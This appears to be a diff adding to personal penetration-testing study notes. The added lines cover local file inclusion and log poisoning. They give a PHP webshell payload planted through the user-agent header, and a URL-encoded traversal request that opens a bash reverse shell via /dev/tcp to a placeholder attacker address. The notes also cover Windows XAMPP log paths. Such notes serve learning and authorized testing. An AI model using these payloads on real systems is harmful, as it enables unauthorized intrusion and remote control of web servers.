@@ -16,3 +16,27 @@ C:\inetpub\wwwroot\web.config
 config file can sometimes have creds.
 
 Remember to \ for windows and / for *nix
+Sometimes you will have to URL encode the chars.
+
+
+Local File Inclusion:
+=====================
+LFI is when you amend a local file with your own
+input. Common use case: 
+Identify logfile via Directory Traversal
+Logfile contains the user-agent. You change your
+user-agent in Burp to be:
+Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+Now the logfile is a webshell.
+
+GET ../../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<<IP ADDY>>%2F<<PORT>>%200%3E%261%22
+
+Now you have a reverse shell. Most likely as www-data.
+
+This kind of Log Poisoning also works on Windows. You just have to know the file paths.
+For example, XAMPP stores them on C:\xampp\apache\logs\
+
+LFI and RFI works with php, perl, asp, aspx, jsp and js.
+You just need to know which lang the app is running.
+
+
